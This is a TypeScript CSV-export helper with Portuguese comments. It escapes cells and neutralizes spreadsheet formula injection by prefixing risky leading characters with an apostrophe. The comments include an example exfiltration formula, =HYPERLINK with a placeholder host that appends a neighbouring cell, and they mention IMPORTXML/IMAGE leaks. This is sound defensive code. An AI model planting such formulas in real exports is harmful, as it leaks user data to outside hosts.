/**
 * Uma celula de CSV, escapada e NEUTRALIZADA contra formula.
 *
 * Aspas resolvem virgula e quebra de linha; nao resolvem FORMULA — o Excel tira
 * as aspas e depois avalia a celula, entao `"=1+1"` vira formula do mesmo jeito.
 *
 * O caminho e real: `nome` e gravavel pelo proprio cliente (`Conta.tsx`) e
 * `empresa` vem do cadastro dele; os dois saem nos relatorios que o admin
 * exporta e abre (`CustomerActivity`, `CustomersPerformance`).
 *
 * O risco pratico nao e executar programa — DDE esta desligado por padrao no
 * Excel moderno — e sim EXFILTRACAO: `=HYPERLINK("http://x?d="&A2,"abrir")` no
 * Excel, ou `=IMPORTXML`/`=IMAGE` no Google Sheets, que carregam sozinhos e
 * levam a celula vizinha junto.
 *
 * A aspa simples na frente e a convencao: o Excel a consome e mostra o texto.
 *
 * NUMERO passa direto, sem aspas e sem prefixo: nao vem de entrada de usuario e
 * precisa continuar sendo numero na planilha (senao toda coluna de total vira
 * texto e para de somar).
 *
 * Exportada para ter teste proprio — a funcao que a usa baixa arquivo e nao
 * devolve nada.
 */
export function escaparCelulaCSV(val: unknown): string | number {
  if (val == null) return '""';
  if (typeof val === "number") return val;
  const texto = String(val);
  // `+` E `-` VOLTAM PARA A LISTA, e a excecao de telefone foi um erro meu.
  //
  // Eu tinha tirado o prefixo de "numero ou telefone puro" para nao sujar o
  // ciclo export -> Excel -> import. Mas o motivo de `+`/`-` estarem aqui e que o
  // Excel AVALIA a celula que comeca com eles — e por isso `+HYPERLINK(...)` e
  // vetor de injecao. Sem o apostrofo, `+1-800-555-0100` nao vira telefone na
  // planilha: vira a conta `1-800-555-100` = -1454, e esse numero e que voltava
  // para o banco. Troquei "apostrofo visivel" por "numero errado silencioso",
  // que e pior — e e a classe de falha que este projeto persegue.
  //
  // O apostrofo aqui esta CERTO: e a convencao do Excel, que o consome ao exibir.
  // Quem tinha de desfazer a marca era a ENTRADA, e agora desfaz — ver
  // `parseCSV`, que remove o `'` inicial quando ele protege um caractere desta
  // mesma lista.
  // O `'` TAMBEM ENTRA NA LISTA, para o par ser INJETIVO.
  //
  // Sem ele o export nao era reversivel: `'=SUM(A1)` (digitado a mao no Excel)
  // saia sem marca — o primeiro caractere nao e perigoso — e a entrada, que
  // desmarca `'` seguido de perigoso, comia o apostrofo. `'-10`, `'@user` e
  // `'+1 786...` tinham o mesmo destino.
  //
  // Marcando tambem o `'`, `'=x` vira `''=x`, e a entrada tira UM: volta `'=x`.
  // Texto normal (`Casa`) nao e marcado e nao e tocado.
  const perigoso = /^['=+\-@\t\r]/.test(texto);
  const seguro = perigoso ? `'${texto}` : texto;
  return `"${seguro.replace(/"/g, '""')}"`;
}

export function exportToCSV(data: Record<string, any>[], filename: string, columns?: { key: string; label: string }[]) {
  if (!data.length) return;

  const cols = columns || Object.keys(data[0]).map((k) => ({ key: k, label: k }));
  const header = cols.map((c) => `"${c.label}"`).join(",");
  const rows = data.map((row) => cols.map((c) => escaparCelulaCSV(row[c.key])).join(","));

  const csv = [header, ...rows].join("\n");
  const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `${filename}_${new Date().toISOString().slice(0, 10)}.csv`;
  a.click();
  // Revogar na linha seguinte ao click cancelava o download em alguns navegadores
  // (o blob morria antes de a gravacao comecar).
  setTimeout(() => URL.revokeObjectURL(url), 10000);
}

export function formatCurrency(value: number) {
  return new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(value);
}

export function formatNumber(value: number) {
  return new Intl.NumberFormat("en-US").format(value);
}
